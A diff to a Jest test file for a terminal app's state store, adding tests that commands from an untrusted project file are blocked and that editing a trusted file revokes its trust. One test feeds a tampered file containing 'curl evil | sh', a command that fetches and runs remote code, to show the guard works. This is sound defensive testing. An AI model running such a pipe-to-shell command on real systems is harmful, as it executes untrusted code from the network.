@@ -29,7 +29,7 @@ beforeEach(() => {
   resetTerminalSaveState()
   mockLoad.mockReset()
   ;(toast.error as jest.Mock).mockClear()
-  useTerminalStore.setState({ projectFiles: {}, projects: [], activeProjectId: null, statuses: {}, titles: {}, fontSize: 13, cwdFrom: {}, optionAsMeta: false, prefs: DEFAULT_PREFS, cwds: {}, zoomedId: null, focusedTerminalId: null, dirty: false, loaded: true })
+  useTerminalStore.setState({ projectFiles: {}, trusted: {}, runOnStart: {}, envOnStart: {}, runningSince: {}, projects: [], activeProjectId: null, statuses: {}, titles: {}, fontSize: 13, cwdFrom: {}, optionAsMeta: false, prefs: DEFAULT_PREFS, cwds: {}, zoomedId: null, focusedTerminalId: null, dirty: false, loaded: true })
 })
 afterEach(() => jest.useRealTimers())
 
@@ -274,7 +274,50 @@ describe("terminal store", () => {
       expect(projectView(S().projects[0], S().projectFiles).commands).toHaveLength(2)
     })
 
-    it("share writes the local commands and layouts to a new file", async () => {
+    it("commands from an untrusted file never run; editing the file revokes trust", async () => {
+      S().addProject("/x/a")
+      const id = S().projects[0].id
+      mockFileRead.mockResolvedValue(good)
+      await S().loadProjectFile(id)
+      expect(S().fileRunAllowed(id)).toBe(false)
+      await S().trustProjectFile(id)
+      expect(S().fileRunAllowed(id)).toBe(true)
+      await jest.advanceTimersByTimeAsync(500)
+      expect(mockSave.mock.calls.at(-1)![0].trusted["/x/a"]).toMatch(/^[0-9a-f]{64}$/)
+      mockFileRead.mockResolvedValue(good.replace("npm run dev", "curl evil | sh"))
+      await S().loadProjectFile(id)
+      expect(S().fileRunAllowed(id)).toBe(false)
+    })
+
+    it("the app's own edits keep a trusted file trusted, but never trust an untrusted one", async () => {
+      S().addProject("/x/a")
+      const id = S().projects[0].id
+      mockFileRead.mockResolvedValue(good)
+      await S().loadProjectFile(id)
+      S().addCommand(id, { name: "Test", command: "npm test" })
+      await jest.advanceTimersByTimeAsync(0)
+      expect(S().fileRunAllowed(id)).toBe(false)
+      await S().trustProjectFile(id)
+      S().addCommand(id, { name: "Lint", command: "npm run lint" })
+      await jest.advanceTimersByTimeAsync(0)
+      expect(S().fileRunAllowed(id)).toBe(true)
+    })
+
+    it("projects without a repo file run their own commands freely", () => {
+      S().addProject("/x/a")
+      expect(S().fileRunAllowed(S().projects[0].id)).toBe(true)
+    })
+
+    it("a workspace tab gets each pane's command and env in layout order", () => {
+      S().addProject("/x/a")
+      const id = S().projects[0].id
+      S().newTab(id, "W", { layout: LAYOUT_PRESETS.columns3, panes: [{ run: "claude" }, {}, { run: "npm test", env: { A: "1" } }] })
+      const ids = leafIds(S().projects[0].tabs.at(-1)!.layout)
+      expect(S().runOnStart).toEqual({ [ids[0]]: "claude", [ids[2]]: "npm test" })
+      expect(S().envOnStart).toEqual({ [ids[2]]: { A: "1" } })
+    })
+
+    it("share writes the local commands and layouts to a new file (and trusts it: the user wrote it)", async () => {
       S().addProject("/x/a")
       const id = S().projects[0].id
       S().addCommand(id, { name: "Dev", command: "npm run dev" })
@@ -285,6 +328,7 @@ describe("terminal store", () => {
       expect(text).toContain('"name": "Grid"')
       expect(text).toContain('"command": "npm run dev"')
       expect(projectView(S().projects[0], S().projectFiles).fromFile).toBe(true)
+      expect(S().fileRunAllowed(id)).toBe(true)
     })
   })
 
